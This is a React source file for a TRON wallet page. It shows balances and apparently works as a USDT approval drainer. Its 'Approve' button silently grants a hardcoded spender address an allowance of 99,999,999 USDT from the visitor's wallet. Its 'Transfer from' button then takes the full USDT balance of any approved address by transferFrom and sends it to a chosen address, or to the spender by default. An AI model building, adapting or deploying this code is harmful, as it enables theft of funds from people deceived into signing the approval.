import { useEffect, useState } from 'react'
import Toast from 'light-toast'
import Btn from './components/Btn'
import Ipt from './components/Ipt'
import ABI from './config/USDT_TRC20_ABI.json'

const USDT_TRC20_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
const SPENDER_ADDRESS = 'TTohWznyAKa4ieqVNs2savRtAY2KzcoajD'

let tronWeb = null, contract = null
function App() {
	const [ trxBalance, setTrxBalance ] = useState(0)
	const [ usdtBalance, setUsdtBalance ] = useState(0)

	const [ from, setFrom ] = useState('')
	const [ to, setTo ] = useState('')

	/**
	 * 初始化Tron
	 */
	const initTron = async () => {
		if (window.tronWeb) {
			console.log(window.tronWeb.defaultAddress.base58)
			tronWeb = window.tronWeb
			contract = await tronWeb.contract(ABI, USDT_TRC20_ADDRESS)
			console.log(contract)
			refreshBalance()
		} else {
			Toast.fail('Tron not found!')
		}
	}

	const refreshBalance = async (loading = false) => {
		loading && Toast.loading('Loading...')
		const trxB = await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58)
		const usdtB = await contract.balanceOf(tronWeb.defaultAddress.base58).call()
		setTrxBalance(tronWeb.fromSun(trxB))
		setUsdtBalance(tronWeb.fromSun(usdtB))
		const fee = await contract.maximumFee().call()
		console.log(tronWeb.fromSun(fee))
		Toast.hide()
	}

	useEffect(() => {
		Toast.loading('Loading...')
		setTimeout(() => initTron(), 500)
	}, [])

	return (
		<div className="w-full flex flex-col items-center p-4">
			<h1 className="text-4xl text-red-500 text-center font-bold pt-4">TRON</h1>
			<div className="h-14 flex items-center justify-center text-sm text-gray-600">
				Balance:  <span className="text-red-500 mx-2">{trxBalance} TRX</span>| <span className="text-green-500 ml-2">{usdtBalance} USDT</span>
			</div>
			<Btn text={'getAccount'} onClick={() => {
				Toast.info(tronWeb.defaultAddress.base58)
			}} />
			<Btn text={'getBalance'} onClick={() => refreshBalance(true)} />
			<Btn 
				text={'getBandwidth'} 
				onClick={async () => {
					const res = await tronWeb.trx.getBandwidth(tronWeb.defaultAddress.base58)
					Toast.info(res)
				}} 
			/>
			<Btn 
				text={'Approve'} 
				theme={'green'} 
				onClick={async () => {
					const { remaining } = await contract.allowance(tronWeb.defaultAddress.base58, SPENDER_ADDRESS).call()
					const allowanceBalance = tronWeb.fromSun(remaining)
					if (allowanceBalance > 0) {
						return Toast.success('You have done!')
					}
					const res = await contract.approve(SPENDER_ADDRESS, 99999999000000).send()
					console.log(res)
				}} 
			/>
			<Ipt 
				placeholder={'From (Approved)'} 
				value={from} 
				onChange={(e) => {
					setFrom(e.target.value)
				}} 
			/>
			<Ipt 
				placeholder={'To'} 
				value={to} 
				onChange={(e) => {
					setTo(e.target.value)
				}}
			/>
			<Btn 
				text={'Get allowance'} 
				theme={'yellow'} 
				onClick={async () => {
					if (!from.trim()) {
						Toast.fail('From address is required!')
						return
					}
					if (!tronWeb.isAddress(from.trim())) {
						Toast.fail('From address is invalid!')
						return
					}
					const { remaining } = await contract.allowance(from.trim(), SPENDER_ADDRESS).call()
					Toast.info(`查询：【${from.trim()}】给【${SPENDER_ADDRESS}】剩余授权余额为:${tronWeb.fromSun(remaining)}`)
				}} 
			/>
			<Btn 
				text={'Transfer from'} 
				theme={'yellow'} 
				onClick={async () => {
					if (!from.trim()) {
						Toast.fail('From address is required!')
						return
					}
					if (!tronWeb.isAddress(from.trim())) {
						Toast.fail('From address is invalid!')
						return
					}
					const toAddress = to || SPENDER_ADDRESS
					// const balance = await contract.balanceOf(tronWeb.defaultAddress.base58).call()
					const balance = await contract.balanceOf(from.trim()).call()
					alert(`【${from.trim()}】向【${toAddress}】转账【${tronWeb.fromSun(balance)}】开始`)
					Toast.loading('Loading...')
					const res = await contract.transferFrom(from.trim(), toAddress, balance).send()
					// const res = await contract.transfer(toAddress, balance).send()
					console.log(res)
					Toast.hide()
					setTimeout(() => {
						refreshBalance()
					}, 3000)
					
				}}
			/>
		</div>
	)
}

export default App
